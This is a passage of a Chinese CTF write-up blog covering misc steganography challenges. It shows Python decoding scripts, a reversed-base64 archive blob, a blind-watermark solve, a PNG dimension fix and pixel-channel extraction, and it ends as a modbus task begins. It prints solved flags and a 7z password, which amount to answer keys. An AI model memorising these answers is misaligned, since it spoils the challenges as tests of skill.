</span></span><span class=line><span class=cl>            <span class=n>a_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>a</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>data2</span> <span class=o>=</span> <span class=n>libnum</span><span class=o>.</span><span class=n>b2s</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>a_list</span><span class=p>[:</span><span class=mi>29424</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data3</span> <span class=o>=</span> <span class=n>xor</span><span class=p>(</span><span class=n>data1</span><span class=p>,</span><span class=n>data2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data3</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>data3</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>func</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># =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</span></span></span></code></pre></td></tr></table></div></div><p>最后我们逆序一下得到的内容，再解码 base64 可以得到一个 rar 压缩包</p><p>下载下来解压或者直接 Cybefchef 中看都能得到最后的 flag：<code>flag{377c9c0c-3d40-44cb-b488-e0464e697b6d}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251009150012499.png alt=/posts/bb1da35/imgs/image-20251009150012499.png height=1754 width=2798></p><h2 class=heading-element id=题目名称-misc_1><span>题目名称 misc_1</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-misc_1 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附加给了一张 <code>encrypt.jpg</code> 和一个加密的 7z 压缩包</p><p>010 打开 JPG 图片，发现末尾藏了一张 PNG 图片，手动提取出来后，发现两张图片的内容是一样的</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251016155345791.png alt=/posts/bb1da35/imgs/image-20251016155345791.png height=1528 width=1416></p><p>经过尝试发现是 <code>BlindWaterMark</code> 盲水印，用原项目或者别的工具处理一下可以得到下图</p><blockquote><p>也是第一次遇到 PNG 和 JPG 一起构成的 BWM 盲水印，之前遇到的都是两张一样格式的图片</p></blockquote><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251016155513630.png alt=/posts/bb1da35/imgs/image-20251016155513630.png height=930 width=1416></p><p>得到 7z 的解压密码：<code>MO@14UX9N#</code>，解压后可以得到下面这张只有一半的二维码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251016155629307.png alt=/posts/bb1da35/imgs/image-20251016155629307.png height=1194 width=2070></p><p>010 打开提示 CRC 报错，因此手动改一下图片宽度或者直接根据 CRC 爆破图片宽高</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251016155709639.png alt=/posts/bb1da35/imgs/image-20251016155709639.png height=1836 width=2810></p><p>调整图片高度后即可得到下图，扫码得到 flag：<code>flag{2FF547637DD54842DB9880B13D5BF363}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251016155800543.png alt=/posts/bb1da35/imgs/image-20251016155800543.png height=832 width=1476></p><h2 class=heading-element id=题目名称-像素2025-安徽省赛><span>题目名称 像素（2025 安徽省赛）</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e5%83%8f%e7%b4%a02025-%e5%ae%89%e5%be%bd%e7%9c%81%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><blockquote><p>题面信息：R>=8,B&lt;=8,G=0</p></blockquote><p>题目附件给了一个<code>e1.bmp</code></p><p>zsteg 扫一把，可以看到一些可疑信息</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251019202904419.png alt=/posts/bb1da35/imgs/image-20251019202904419.png height=2184 width=3110></p><p>然后也可以到 stegsolve 中看，发现能显示出来部分隐写的内容</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251019203004362.png alt=/posts/bb1da35/imgs/image-20251019203004362.png height=1456 width=2000></p><p>我们用 PS 打开这张图片，发现末尾的像素全是<code>(0,0,0)</code>，因此很明显是一行一行隐写下来的</p><p>并且发现所有像素的 G 通道的数据都是 0，所以猜测 G 通道是没有用来隐写数据的</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251019203155616.png alt=/posts/bb1da35/imgs/image-20251019203155616.png height=1836 width=2940></p><p>结合之前 stegsolve 得到的部分隐写内容，发现这部分内容都是在像素只有 B 通道有值的情况下提取出来的</p><p>这种情况下提取出来的值转 ASCII 后都是英文可打印字符</p><p>而图中的像素还有另外一种情况，就是 R 和 B 通道都有值，但是 G 通道的值是 0</p><p>结合题面信息，猜测是 R 的数值在高8位而 B 的数值在低8位，这种情况下的 ASCII 值就比较大</p><p>尝试输出几个后发现是中文汉字，因此我们写个脚本提取出所有隐写的内容即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># R&gt;=8,B&lt;=8,G=0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>pixel_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;e1.bmp&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span><span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span> <span class=c1># 35 35</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(w,h) </span>
</span></span><span class=line><span class=cl>    <span class=n>out_img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;RGB&#39;</span><span class=p>,(</span><span class=n>w</span><span class=p>,</span><span class=n>h</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=p>,</span><span class=n>g</span><span class=p>,</span><span class=n>b</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>pixel_list</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>r</span><span class=p>,</span><span class=n>g</span><span class=p>,</span><span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>r</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=ow>and</span> <span class=p>(</span><span class=n>g</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>res</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	            <span class=c1># R的数值在高8位, B的数值在低8位</span>
</span></span><span class=line><span class=cl>                <span class=n>tmp</span> <span class=o>=</span> <span class=p>(</span><span class=n>r</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>                <span class=n>res</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>tmp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>func</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>运行以上脚本后即可提取出如下内容，最后的 flag: <code>flag{像素的隐写isflagAhi隐写像素}</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CTF的竞赛方向？
</span></span><span class=line><span class=cl>由于CTF知识面很广，一个人不可能面面俱到，所以选手们通常都会选择一个自己喜欢的方向深入研究，，通常分为五个方向:MISC、CRYPTO、WEB、REVERSE、PWN：
</span></span><span class=line><span class=cl>杂项MISC安全杂项涉及到古典密码学、编码、隐写术、电子取证、数据分析等广度极高的安全手段及利用方法，选手需要确定手段或者方法，反向的去破译取证从而拿到flag，MISC是CTF比赛中广度最高的方向，需要各个方向都有涉猎。——嗯？题不知道丢哪？没事丢杂项就好！
</span></span><span class=line><span class=cl>密码学CRYPTO密码学简单讲就古典密码和现代密码，当然大多数古典密码的题目目前都被划分到MISC中，目前的密码学反而更偏向现代密码学，常出现分组密码、流密码和公钥密码体制的考察，对初等数学、基本的数论有一定需求。选手通常被给予一个加密程序，抹去明文之后留下的加密过程和输出，要求选手通过密码体制的弱点来还原flag。
</span></span><span class=line><span class=cl>网络攻防WEB着重于Web应用程序，框架，浏览器以及各类Web服务器的安全问题；挖掘/利用/研究各类Web系漏洞，探究其形成原理、利用方式及修补方案。题目常见的漏洞类型包括注入、XSS、文件包含、代码执行、上传、SSRF等，选手通过漏洞直接或者间接拿到shell或者得到某些关键文件从而得到Flag。
</span></span><span class=line><span class=cl>逆向工程ReverseEngineering研究各类操作系统，编译器，虚拟机的底层架构，以Windows和Linux为平台，学习可执行程序的逆向分析技术，如软件调试与破解，对已经编译完成的可执行文件进行分析，研究程序的行为和算法，然后以此为依据，计算出出题人想隐藏的flag
</span></span><span class=line><span class=cl>二进制漏洞利用PwnPwn在安全领域是「攻破」的意思。主要研究程序漏洞利用技术，例如栈溢出、堆管理器的漏洞利用和其他高阶技巧；挖掘和分析各类基于编译型语言的漏洞。二进制攻击涉及到栈溢出、堆溢出、格式化字符串漏洞等二进制漏洞，选手需要借助这些漏洞获取计算机权限，从而拿到flag
</span></span><span class=line><span class=cl>SOMETHINGNEW随着计算机技术的发展，也有一些新的方向如「区块链Blockchain」「AI安全」「物联网IoT」等的加入。这些内容我们会在进阶文档中更新。
</span></span><span class=line><span class=cl>如果你看着五个方向思考良久，一下子不太确定自己的方向，这里提供一些小参考，你可以通过下面两个方向先熟悉一下CTF的一些流程，找找——嗯，感觉~
</span></span><span class=line><span class=cl>网络攻防WEB
</span></span><span class=line><span class=cl>在传统的CTF线上比赛中，Web类题目是主要的题型之一。
</span></span><span class=line><span class=cl>相较于二进制、逆向等类型的题目，参赛者不需掌握系统底层知识;
</span></span><span class=line><span class=cl>相较于密码学、以及一些杂项问题，不需具特别强的编程能力，故入门较为容易。
</span></span><span class=line><span class=cl>杂项MISC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MISC具有极大的趣味性；
</span></span><span class=line><span class=cl>flag{像素的隐写isflagAhi隐写像素}
</span></span><span class=line><span class=cl>MISC的入门难度包含维度很广但都很简单，非常适合用来快速熟悉CTF的比赛模式和规则。</span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=题目名称-kof><span>题目名称 KOF</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-kof class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了下面这张 PNG 图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251020194619403.png alt=/posts/bb1da35/imgs/image-20251020194619403.png height=976 width=1642></p><p>stegsolve 看一下，发现每个通道的 <code>Plane 1</code> 存在明显的隐写痕迹</p><table><thead><tr><th><img loading=lazy src=/posts/bb1da35/imgs/image-20251020194910664.png alt=/posts/bb1da35/imgs/image-20251020194910664.png height=1032 width=1400><br><br></th><th><img loading=lazy src=/posts/bb1da35/imgs/image-20251020194825827.png alt=/posts/bb1da35/imgs/image-20251020194825827.png height=1032 width=1400><br><br></th><th><img loading=lazy src=/posts/bb1da35/imgs/image-20251020194853369.png alt=/posts/bb1da35/imgs/image-20251020194853369.png height=1032 width=1400><br><br></th></tr></thead><tbody></tbody></table><p>提取隐写的内容，然后解个十六进制即可得到 flag: <code>flag{059c7eba4f3f451fb5f4}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251020194947735.png alt=/posts/bb1da35/imgs/image-20251020194947735.png height=568 width=716></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251020195004200.png alt=/posts/bb1da35/imgs/image-20251020195004200.png height=1200 width=1600></p><h2 class=heading-element id=题目名称-代码之神><span>题目名称 代码之神</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e4%bb%a3%e7%a0%81%e4%b9%8b%e7%a5%9e class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个 txt 文件，里面的内容如下：</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251020195110862.png alt=/posts/bb1da35/imgs/image-20251020195110862.png height=1800 width=2880></p><p>直接写个脚本隔一位提取其中的字母和符号，然后按字频排序一下即可得到flag：<code>flag{G0d-OF~CoDe}</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;1.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>res1</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>res2</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>idx</span><span class=p>,</span><span class=n>item</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>idx</span> <span class=o>%</span><span class=mi>2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>res1</span> <span class=o>+=</span> <span class=n>item</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>res2</span> <span class=o>+=</span> <span class=n>item</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res2</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251020195229887.png alt=/posts/bb1da35/imgs/image-20251020195229887.png height=1504 width=1656></p><h2 class=heading-element id=题目名称-modbus><span>题目名称 modbus</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-modbus class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了一个流量包，结合题目名称猜测关键信息应该在 modbus 流量中</p><p>因此我们直接用 tshark 提取一下通过 modbus 传输的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
